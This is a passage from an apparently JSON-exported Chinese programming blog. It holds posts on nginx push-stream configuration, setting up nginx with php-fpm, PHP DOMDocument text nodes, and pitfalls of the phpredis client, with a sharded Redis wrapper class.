class=\"org-ul\">\n<li>\u66f4\u6210\u719f\n\u6709\u5185\u5b58\u6d88\u8017\u8bf4\u660e\u6587\u6863\uff0c\u4fbf\u4e8e\u51b3\u5b9a\u5171\u4eab\u5185\u5b58\u5bb9\u91cf\u914d\u7f6e\u3002\n\u6709\u7edf\u8ba1\u529f\u80fd\u3002\n\u53ef\u5bf9\u54cd\u5e94\u5185\u5bb9\u8fdb\u884c\u518d\u5904\u7406\u3002\n<\/li>\n<li>\u6d4b\u8bd5\u4e2d\u672a\u53d1\u73b0\u660e\u663e\u7684\u5185\u5b58\u6cc4\u9732\n<\/li>\n<li>\u5185\u7f6e\u652f\u6301jsonp\n\u8fd4\u56de\u7684jsonp\u662f\u8fd9\u6837\u7684\u683c\u5f0fcallback([text])\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539ngx_http_push_stream_module_utils.h\u4e2d\u5b9a\u4e49\u7684NGX_HTTP_PUSH_STREAM_CALLBACK_INIT_CHUNK\u548cNGX_HTTP_PUSH_STREAM_CALLBACK_END_CHUNK\u53bb\u9664\u591a\u4f59\u7684\u4e2d\u62ec\u53f7\u3002\n<\/li>\n<\/ul>\n<\/dd>\n\n<dt> \u53c2\u8003\u914d\u7f6e <\/dt><dd><\/dd>\n<\/dl>\n<pre class=\"example\">\npush_stream_store_messages off;\npush_stream_max_subscribers_per_channel 1;\npush_stream_subscriber_connection_ttl 60s;\npush_stream_longpolling_connection_ttl 60s;\n\nserver {\n    listen 80;\n    server_name localhost 127.0.0.1;\n    \n    ...\n\n    location ~ ^\/publish$ {\n        allow 127.0.0.1;\n        deny all;\n        push_stream_publisher admin;\n        set $push_stream_channel_id $arg_id;\n    }\n    \n    location ~ ^\/activity$ {\n        push_stream_subscriber long-polling;\n        set $push_stream_channels_path $arg_id;\n        push_stream_content_type \"application\/json\";\n        push_stream_message_template \"~text~\";\n    }\n\n    ...\n}\n<\/pre>\n<\/div>\n<\/div>\n"
},
{
  "title": "nginx\u4e0b\u5feb\u901f\u642d\u5efaphp\u8fd0\u884c\u73af\u5883",
  "timestamp": "2012-08-11 21:09:00",
  "tags": [
    "nginx",
    "php"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5b89\u88c5<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<\/div><div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">\u5b89\u88c5nginx<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<p>\nyaourt -S nginx\n<\/p>\n<\/div>\n<\/div>\n<div id=\"outline-container-sec-1-2\" class=\"outline-3\">\n<h3 id=\"sec-1-2\">\u5b89\u88c5php<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-2\">\n<p>\nyaourt -S php\n<\/p>\n<\/div>\n<\/div>\n<div id=\"outline-container-sec-1-3\" class=\"outline-3\">\n<h3 id=\"sec-1-3\">\u5b89\u88c5php-fpm<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-3\">\n<p>\nyaourt -S php-fpm\n<\/p>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u914d\u7f6e<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<\/div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">\u914d\u7f6enginx<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<ul class=\"org-ul\">\n<li>\u5c06nginx.conf\u4e2d\u7684\u4ee5\u4e0b\u90e8\u5206\uff1a\n<pre class=\"example\">\n#location ~ \\.php$ {\n...\n#}\n<\/pre>\n<\/li>\n<li>\u4fee\u6539\u4e3a\n<pre class=\"example\">\nlocation ~ \\.php$ {\n   root           \/usr\/share\/nginx\/html;\n   fastcgi_pass   127.0.0.1:9000;\n   fastcgi_index  index.php;\n   fastcgi_param  SCRIPT_FILENAME  \/usr\/share\/nginx\/html$fastcgi_script_name;\n   include        fastcgi_params;\n}\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">\u914d\u7f6ephp<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n\u5728open_basedir\u4e2d\u6dfb\u52a0\uff1a\/usr\/share\/nginx\/html\n<\/p>\n<\/div>\n<\/div>\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">\u914d\u7f6ephp-fpm.conf<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<p>\n\u542f\u7528\u4ee5\u4e0blisten\u914d\u7f6e\uff1a\nlisten = 127.0.0.1:9000\n<\/p>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u8fd0\u884c<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>\u91cd\u542fnginx\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo \/etc\/rc.d\/nginx restart\n<\/pre>\n<\/div>\n<\/li>\n<li>\u542f\u52a8php-fpm\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo php-fpm\n<\/pre>\n<\/div>\n<\/li>\n<li>\u7136\u540e\u5728\/usr\/share\/nginx\/html\u76ee\u5f55\u4e2d\u5199php\u811a\u672c\u5373\u53ef\u3002\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "php\u4e2dDOMDocument\u7c7bcreateElement\u548ccreateTextNode\u7684\u533a\u522b",
  "timestamp": "2012-09-27 19:05:00",
  "tags": [
    "php"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">DOMDocument::createElement<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u539f\u578b\uff1aDOMElement DOMDocument::createElement ( string $name [, string $value ] )\n\n<p>\n\u521b\u5efa\u4e00\u4e2a\u5143\u7d20\uff0c\u5176\u4e2d\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u4e0d\u4f1a\u5bf9\u5b83\u8fdb\u884c\u8f6c\u4e49\u3002\u5f53value\u4e2d\u5305\u542b\u7279\u6b8a\u5b57\u7b26\uff08\u5982\uff1a&amp;\uff09\u4f1a\u51fa\u9519\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">Domdocument::createTextNode<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>\u539f\u578b\uff1aDOMText DOMDocument::createTextNode ( string $content )\n\n<p>\n\u521b\u5efa\u4e00\u4e2a\u6587\u672c\u7ed3\u70b9\uff0c\u4f1a\u5bf9\u5176\u5185\u5bb9\u8fdb\u884c\u8f6c\u4e49\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5178\u578b\u793a\u4f8b\uff1a\u521b\u5efa\u4e00\u4e2a\u6587\u672c\u5143\u7d20<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\">$<span style=\"color: #ffcc66;\">element<\/span> = $<span style=\"color: #ffcc66;\">doc<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">createElement<\/span>(<span style=\"color: #66cccc;\">\"city\"<\/span>);\n$<span style=\"color: #ffcc66;\">node<\/span> = $<span style=\"color: #ffcc66;\">doc<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">createTextNode<\/span>(<span style=\"color: #66cccc;\">\"shenzhen\"<\/span>);\n$<span style=\"color: #ffcc66;\">element<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">appendChild<\/span>($<span style=\"color: #ffcc66;\">node<\/span>);\n$<span style=\"color: #ffcc66;\">doc<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">appendChild<\/span>($<span style=\"color: #ffcc66;\">element<\/span>);\n<\/pre>\n<\/div>\n<ul class=\"org-ul\">\n<li>\u5bf9\u5e94\u7684xml\u6587\u6863\uff1a\n<\/li>\n<\/ul>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-xml\">&lt;<span style=\"color: #f99157;\">city<\/span>&gt;shenzhen&lt;\/<span style=\"color: #f99157;\">city<\/span>&gt;\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5f53php\u9047\u4e0aredis",
  "timestamp": "2012-12-08 13:41:00",
  "tags": [
    "php",
    "redis"
  ],
  "body": "<p>\n\u5728\u6700\u8fd1\u7684\u9879\u76ee\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u5728php\u4e2d\u8bbf\u95eeredis\uff0c\u6211\u4eec\u9009\u62e9\u4e86\u4f7f\u7528<a href=\"https:\/\/github.com\/nicolasff\/phpredis\">phpredis<\/a>\u5e93\uff0c\u4e0b\u9762\u662f\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">redis\u6301\u4e45\u8fde\u63a5\u4e0d\u9760\u8c31\u3002<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u53ef\u4ee5\u8bf4\u8fd9\u662fphp\u7684\u901a\u75c5\u4e86\uff0c\u4e0d\u7ba1\u662fmysql\u3001memcache\u8fd8\u662fredis\uff0c\u6307\u671b\u7531php\u672c\u8eab\uff08\u5305\u542bphp\u6269\u5c55\uff09\u6765\u5b9e\u73b0\u6301\u4e45\u8fde\u63a5\u90fd\u662f\u884c\u4e0d\u901a\u7684\u3002\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> \u4e3a\u4ec0\u4e48\u8fd9\u4e48\u8bf4\u5462\uff1f <\/dt><dd>     \u9996\u5148\uff0c\u6240\u8c13\u7684\u6301\u4e45\u8fde\u63a5\u7684\u5b9e\u73b0\u4e0d\u5916\u4e4e\u5728\u8fdb\u7a0b\uff08php-fpm\uff09\u5185\u5efa\u4e00\u4e2a\u8fde\u63a5\u6c60\uff0c\u5f53php\u9700\u8981\u8fde\u63a5\u65f6\uff0c\u5148\u4ee5ip+port\u7b49\u4fe1\u606f\u4e3akey\u5728\u6c60\u4e2d\u67e5\u627e\uff0c\u627e\u5230\u5219\u76f4\u63a5\u8fd4\u56de\u5df2\u6709\u8fde\u63a5\u6ca1\u6709\u5219\u65b0\u5efa\u8fde\u63a5\u3002\u800c\u5f53\u4e00\u4e2a\u8bf7\u6c42\u6267\u884c\u7ed3\u675f\u65f6\uff0c\u4e0d\u5173\u95ed\u8fde\u63a5\uff0c\u800c\u662f\u628a\u8fde\u63a5\u5f52\u8fd8\u5230\u6c60\u4e2d\u3002\n\n<p>\n\u8fd9\u6837\u5f53php\u9700\u8981\u7528\u5230\u591a\u4e2aredis\u5b9e\u4f8b\u65f6\uff08\u5206\u5e93\uff09\uff0c\u56e0\u4e3a\u4e00\u4e2aphp-fpm\u8fdb\u7a0b\u4f1a\u6301\u6709\u6bcf\u4e2aredis\u5b9e\u4f8b\u7684\u4e00\u4e2a\u8fde\u63a5\uff0c\u6240\u4ee5\u9700\u8981\u201cphp-fpm\u8fdb\u7a0b\u6570\u201c*\u201credis\u5b9e\u4f8b\u6570\"\u4e2aredis\u8fde\u63a5\uff0c\u800c\u5bf9\u4e8e\u6bcf\u4e2aredis\u670d\u52a1\u5668\u5219\u6709\u201cphp-fpm\u8fdb\u7a0b\u6570\u201c\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5\u3002\n<\/p>\n\n<p>\n\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u4e00\u4e2aweb\u5e94\u7528\u5f00\u4e861000\u4e2aphp-fpm\u8fdb\u7a0b\uff0c\u670910\u4e2aredis\u5b9e\u4f8b\uff0c\u90a3\u4e48\u4fdd\u6301\u7684redis\u8fde\u63a5\u6570\u5c31\u4e3a1000*10\u4e5f\u5c31\u662f10000\uff0c\u6bcf\u4e2aredis\u5b9e\u4f8b\u67091000\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5\u3002\u5982\u679c\u524d\u7aef\u6216redis\u518d\u6269\u5bb9\u6240\u9700\u8981\u7684\u8fde\u63a5\u5c31\u4f1a\u4ee5\u4e58\u79ef\u65b9\u5f0f\u589e\u52a0\u3002\u4e00\u4e2aredis\u5b9e\u4f8b\u6709php-fpm\u8fdb\u7a0b\u6570\u4e2a\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b\u8868\u73b0\u5982\u4f55\u5462\uff0c\u8fd9\u5c31\u8981\u597d\u597d\u6d4b\u4e00\u6d4b\u4e86\uff0c\u53cd\u6b63\u662f\u6bcf\u8fde\u63a5\u4e00\u7ebf\u7a0b\u7684mysql\u662f\u76f4\u63a5\u5835\u6b7b\u4e86\u3002\n<\/p>\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">RedisArray\u4e0d\u9760\u8c31\u3002<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\nRedisArray\u5b9e\u73b0\u4e86\u4e00\u81f4\u6027hash\u5206\u5e03\u5f0f\uff0c\u4f46\u662f\u5b83\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u5c31\u4f1a\u8fde\u63a5\u4e0a\u6bcf\u4e2a\u5b9e\u4f8b\uff0c\u8fd9\u5728web\u5e94\u7528\u4e2d\u7b80\u76f4\u662f\u80e1\u95f9\uff0c\u5b83\u5bf9\u4e00\u81f4\u6027hash\u5b9e\u73b0\u5f97\u6bd4\u8f83\u5b8c\u5584\uff0c\u7ed3\u70b9\u5931\u6548\u3001\u52a8\u6001\u6dfb\u52a0\u7ed3\u70b9\u65f6\u91cd\u65b0hash\u90fd\u6709\u5904\u7406\uff0c\u5728\u4e07\u4e0d\u5f97\u5df2\u8fdb\u884c\u6c34\u5e73\u6269\u5bb9\u65f6\uff0c\u53ef\u80fd\u4f1a\u7528\u5f97\u4e0a\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u9700\u8981\u81ea\u5df2\u5173\u95edredis\u8fde\u63a5\u3002<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\nRedis\u7684\u6790\u6784\u51fd\u6570\u6ca1\u6709\u5173\u95edredis\u8fde\u63a5\uff0c\u8fd9\u4f1a\u5bfc\u81f4redis\u7f51\u7edc\u8d1f\u8f7d\u8fc7\u9ad8\uff0c\u8981\u786e\u4fdd\u811a\u672c\u7ed3\u675f\u65f6\u5173\u95ed\u8fde\u63a5\uff0c\u6700\u597d\u662f\u80fd\u591f\u5c01\u88c5\u4e00\u4e0bRedis\u7c7b\u518d\u4f7f\u7528\u3002\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> \u793a\u4f8b\u5c01\u88c5 <\/dt><dd><\/dd>\n<\/dl>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#20998;&#24067;&#24335;Redis.<\/span>\n<span style=\"color: #99cc99;\">class<\/span> <span style=\"color: #6699cc;\">RedisShard<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#26500;&#36896;&#20989;&#25968;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">public<\/span> <span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">__construct<\/span>($<span style=\"color: #ffcc66;\">shards<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">reinit<\/span>($<span style=\"color: #ffcc66;\">shards<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#26512;&#26500;&#20989;&#25968;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#33050;&#26412;&#32467;&#26463;&#26102;&#65292;phpredis&#19981;&#20250;&#33258;&#21160;&#20851;&#38381;redis&#36830;&#25509;&#65292;&#36825;&#37324;&#28155;&#21152;&#33258;&#21160;&#20851;&#38381;&#36830;&#25509;&#25903;&#25345;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#21487;&#20197;&#36890;&#36807;&#25163;&#21160;unset&#26412;&#31867;&#23545;&#35937;&#24555;&#36895;&#37322;&#25918;&#36164;&#28304;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">public<\/span> <span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">__destruct<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">close<\/span>();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#37325;&#26032;&#21021;&#22987;&#21270;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">public<\/span> <span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">reinit<\/span>($<span style=\"color: #ffcc66;\">shards<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">index<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shards<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">shards<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">shard<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shards<\/span>[$<span style=\"color: #ffcc66;\">index<\/span>] = <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">':'<\/span>, $<span style=\"color: #ffcc66;\">shard<\/span>); <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#26684;&#24335;&#65306;host:port:db<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shards<\/span>[$<span style=\"color: #ffcc66;\">index<\/span>][<span style=\"color: #66cccc;\">'index'<\/span>] = $<span style=\"color: #ffcc66;\">index<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ++$<span style=\"color: #ffcc66;\">index<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }<span style=\"color: #f2777a; background-color: #515151;\">        <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#36716;&#21457;&#26041;&#27861;&#35843;&#29992;&#21040;&#30495;&#27491;&#30340;redis&#23545;&#35937;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">public<\/span> <span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">__call<\/span>($<span style=\"color: #ffcc66;\">name<\/span>, $<span style=\"color: #ffcc66;\">arguments<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">call_user_func_array(array(<\/span>$<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">redis<\/span>($<span style=\"color: #ffcc66;\">arguments<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>]), $<span style=\"color: #ffcc66;\">name<\/span>)<span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">arguments<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">result<\/span> === <span style=\"color: #6699cc;\">false<\/span> <span style=\"color: #99cc99;\">and<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">in_array(<\/span>$<span style=\"color: #ffcc66;\">name<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'set'<\/span>, <span style=\"color: #66cccc;\">'setex'<\/span>, <span style=\"color: #66cccc;\">'incr'<\/span>)))<span style=\"text-decoration: underline;\"> {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">trigger_error(<\/span><span style=\"color: #66cccc;\">\"redis error: \"<\/span> . $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>] . <span style=\"color: #66cccc;\">':'<\/span> . $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">] . <\/span><span style=\"color: #66cccc; text-decoration: underline;\">':'<\/span><span style=\"text-decoration: underline;\"> .$<\/span><span style=\"color: #6699cc; text-decoration: underline;\">this<\/span><span style=\"text-decoration: underline;\">-&gt;<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">shard<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">2<\/span><span style=\"text-decoration: underline;\">] . <\/span><span style=\"color: #66cccc; text-decoration: underline;\">\" $name \"<\/span><span style=\"text-decoration: underline;\"> . <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">implode(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' '<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">arguments<\/span><span style=\"text-decoration: underline;\">), <\/span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_NOTICE<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">result<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#33719;&#21462;1&#33267;max&#38388;&#30340;&#21807;&#19968;&#24207;&#21495;name&#65292;&#36798;&#21040;max&#21518;&#20250;&#20174;1&#24320;&#22987;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">redis&#30340;&#36882;&#22686;&#21040;&#26368;&#22823;&#20540;&#21518;&#20250;&#36820;&#22238;&#38169;&#35823;&#65292;&#26412;&#26041;&#27861;&#23454;&#29616;&#23433;&#20840;&#30340;&#36882;&#22686;&#12290;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#22833;&#36133;&#36820;&#22238;false&#65292;&#26368;&#35201;&#30830;&#20445;&#24050;&#29992;redis()&#26041;&#27861;&#36830;&#21040;&#29983;&#25104;&#24207;&#21495;&#30340;&#26576;&#20010;redis&#23545;&#35937;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">public<\/span> <span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">id<\/span>($<span style=\"color: #ffcc66;\">name<\/span>, $<span style=\"color: #ffcc66;\">max<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">id<\/span> = $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">incr<\/span>(<span style=\"color: #66cccc;\">'_id_'<\/span> . $<span style=\"color: #ffcc66;\">name<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">id<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">max<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">intval(<\/span>$<span style=\"color: #ffcc66;\">max<\/span>\/<span style=\"color: #cccccc; background-color: #2d2d2d;\">count(<\/span>$<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shards<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">id<\/span> % $<span style=\"color: #ffcc66;\">max<\/span> == <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">decrBy<\/span>(<span style=\"color: #66cccc;\">'_id_'<\/span> . $<span style=\"color: #ffcc66;\">name<\/span>, $<span style=\"color: #ffcc66;\">max<\/span>) &gt;=<span style=\"text-decoration: underline;\"> $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">max<\/span><span style=\"text-decoration: underline;\">){<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: 